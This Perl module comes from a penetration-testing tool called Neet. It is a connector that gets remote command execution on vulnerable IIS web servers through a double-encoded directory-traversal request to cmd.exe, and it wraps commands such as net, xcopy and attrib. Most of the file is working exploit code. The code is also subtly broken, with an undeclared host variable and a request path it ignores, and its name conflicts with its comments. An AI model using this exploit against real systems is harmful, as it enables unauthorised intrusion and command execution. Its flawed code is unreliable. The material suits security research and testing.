##########################################################################
#
#    Neet: Network discovery, enumeration and security assessment tool
#    Copyright (C) 2008-2014 Jonathan Roach
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    Contact: jonnyhightower [at] funkygeek.com
#
##########################################################################

# JR::ConnectorSQLInject.pm

# This is the "IIS Unicode" connector for the ishell command shell framework.
# Jonathan Roach

# It uses HTTP/HTTPS to obtain command execution on vulnerable hosts.

# All connectors should provide the same base interface to the calling iShell.
# new		-> create a new instance of the connector. This should only return a connector object
#		   if the initial connection succeeds
# test		-> test for command shell capabilities. Should return 1 for "yes, we have a shell" or
# 		   otherwise 0
# execute	-> execute this system command - returns an array of output
# ServerTime	-> get the date/time from the server
# OS		-> get the OS version
# Server	-> get the Server version
# Args		-> return a hash of parameters that should be supplied.
# BaseDir	-> get the directory that the exploited service is based
# Environment	-> get a hash of the environment variables
# disconnect	-> Close the connection


use strict;

package JR::iShell::ConnectorSQLInject;
use IO::Socket;
use JR::iShell::OutputIsolator;

sub new {
	my $PKG=shift();
	my %SQLSite=@_;
	my %Connector;

	my %RequiredArgs;
	$RequiredArgs{'Args'}="URL SSL";
	$RequiredArgs{'Optional'}="SSL";
	$RequiredArgs{'Mandatory'}="URL";
	$RequiredArgs{'Defaults'}{'SSL'}="0";
	$RequiredArgs{'Defaults'}{'URL'}="http://localhost/";

	$SQLSite{"URL"}="$RequiredArgs{'Defaults'}{'URL'}" if (!$SQLSite{"URL"});
	$SQLSite{'SSL'}="$RequiredArgs{'Defaults'}{'SSL'}" if (!$SQLSite{"SSL"});

	$SQLSite{'Type'}="Windows";
	$SQLSite{'SysPath'}="..%255c..%255c..%255cwinnt/system32/";	
	$SQLSite{'Path'}=$SQLSite{'SysPath'};
	$SQLSite{'CommandInterpreter'}="cmd.exe";
	$SQLSite{'RequiredArgs'}=\%RequiredArgs;

	$SQLSite{'HTMLobj'}=new OutputIsolator();
	my $ConnectorObject=\%SQLSite;
	bless $ConnectorObject, $PKG;
	return $ConnectorObject;
}

sub test {
	print "TESTING\n";
	my $SQLSite=shift();
	my $OutputIsolator=$$SQLSite{'HTMLobj'};
	my $teststring="__OutputIsolatorCalibration__OICalibrate__"x3;
	for (my $a=0; $a<10; $a++){
		# This is not required to be cryptographically strong!! :-)
		$teststring .= int(rand(1000));
	}
	print "Calibrating...\n";
	until ($OutputIsolator->isCalibrated){
		$OutputIsolator->LoadPage($SQLSite->_subSubmit("echo $teststring"));
		$OutputIsolator->Calibrate("$teststring");
	}
	print "Calibrated at " . $$OutputIsolator{'Index'} . "\n";
	
	my @results=$SQLSite->execute("ver");
	my $ok=0;
	for my $line (@results){
		if ($line =~ /^Microsoft/){
			$ok=1;
		}
	}
	return $ok;
}

sub execute {
	my $SQLSite=shift();
	my $OutputIsolator=$$SQLSite{'HTMLobj'};
	my $fullcommand=shift();
	my $exe=$$SQLSite{'CommandInterpreter'};
	my $path=$$SQLSite{'Path'};
	my @commands = split "&&", $fullcommand;
	my @newcommand;
	for my $command (@commands){
		$command =~ s/^\s+//;
		if ($command =~ /xcopy /){
			$exe="xcopy.exe";
			$path=$$SQLSite{'SysPath'};
			$command =~ s/xcopy //;
			pop @newcommand;
		}
		if ($command =~ /net /){
			$exe="net.exe";
			$path=$$SQLSite{'SysPath'};
			$command =~ s/net //;
			pop @newcommand;
		}
		if ($command =~ /net1 /){
			$exe="net1.exe";
			$path=$$SQLSite{'SysPath'};
			$command =~ s/net1 //;
			pop @newcommand;
		}
		if ($command =~ /attrib /){
			$exe="attrib.exe";
			$path=$$SQLSite{'SysPath'};
			$command =~ s/attrib //;
			pop @newcommand;
		}
		push @newcommand, $command;
	}
	my $command=join "&& ", @newcommand;
	$command = "/c+" . $command if (("$exe" eq "$$SQLSite{'CommandInterpreter'}") || ("$exe" eq "cmd.exe"));
	$exe = $path . $exe;
	my $cmd="/scripts/" . $exe . "?$command";
	my @res=$SQLSite->httpget($cmd);
	$OutputIsolator->LoadPage(@res);
	my @results=$OutputIsolator->GetOutput;
	return @results;
}

sub _subSubmit {
	my $SQLSite=shift();
	my $command=shift();
	my $exe=$$SQLSite{'Path'} . $$SQLSite{'CommandInterpreter'};
	my $cmd="/scripts/" . $exe . "?/c+$command";
	my @result=$SQLSite->httpget($cmd);
	return @result;
}

sub ServerTime {
	my $OBJ=shift();
	return $$OBJ{'Date'};
}

sub OS {
	my $OBJ=shift();
	my @result=$OBJ->execute("ver");
	return $result[1];
}

sub Args {
	my $OBJ=shift();
	return %{$$OBJ{'RequiredArgs'}};
}

sub Server {
	my $OBJ=shift();
	return $$OBJ{'Server'};
}

sub BaseDir {
	my $OBJ=shift();
	my @result=$OBJ->execute("cd");
	return $result[0];
}

sub Environment {
	my $OBJ=shift();
	my @result=$OBJ->execute("set");
	my %env;
	for my $line (@result){
		next if (!$line);
		my ($var,$val)=split "=", $line;
		$env{$var}=$val;
	}
	return %env;
}

sub disconnect {
	my $OBJ=shift();
	return 1;
}

sub close {
	my $OBJ=shift();
	return disconnect($OBJ);
}

sub httpget {
	my $SQLSite=shift();
	my $URL=$$SQLSite{'URL'};
	my $Port=80;
	my @urltokens=split "/", $URL;
	
	

	my $cmd = urlencode($URL);
	my $headercount=0; my $timeout=10; my $tries=0;
	my $headers="Connection: Keep-Alive\r\n";
	my @output;


	while (!$headercount){
		$tries++;
		my $socket = IO::Socket::INET->new('PeerAddr'=>"$Host", 'PeerPort'=>"$Port", 'Proto'=>'tcp', 'Blocking'=>'1', 'Timeout'=>'10');
		print $socket "GET $cmd HTTP/1.1\r\nHost: $Host\r\n$headers\r\n";
		my @raw=<$socket>;
		$socket->close;
		my $head=1;
		for my $line (@raw){
			if ($line !~ /\S/){
				$head=0;
				next;
			}
			if ($head){
				$headercount++;
				if ($line =~ /^Server: /){
					$line =~ s/[\r\n]//g;
					$$SQLSite{'Server'}=substr($line,index($line," ")+1,length($line)-index($line," "));
				}
				if ($line =~ /^Date: /){
					$line =~ s/[\r\n]//g;
					$$SQLSite{'Date'}=substr($line,index($line," ")+1,length($line)-index($line," "));
				}
			} else {
				push @output, $line;
			}
		}
		if ($tries > $timeout) {
			print STDERR ("Couldn't get HTTP response\n");
			sleep 5;
			return undef;
		}
	}
	return @output;
}

sub urlencode {
	my $string=shift();
	$string =~ s/ /%20/g;
	$string =~ s/&/%26/g;
	return $string;
}


sub register {
	# Gets called at installation time 
	eval {
		require JR::Catalog;
	};
	if ($@){
		print STDERR "Couldn't load JR::Catalog. Didn't register.\n";
		return 0;
	}
	my $reg=Catalog->new;
	if (!$reg->isRegistered("Module"=>"ConnectorSQLInject")){
		return $reg->Register("Type"=>"iShellConnector","Object"=>"SQLInject","Module"=>"ConnectorSQLInject");
	}
	return 0;
}

1;


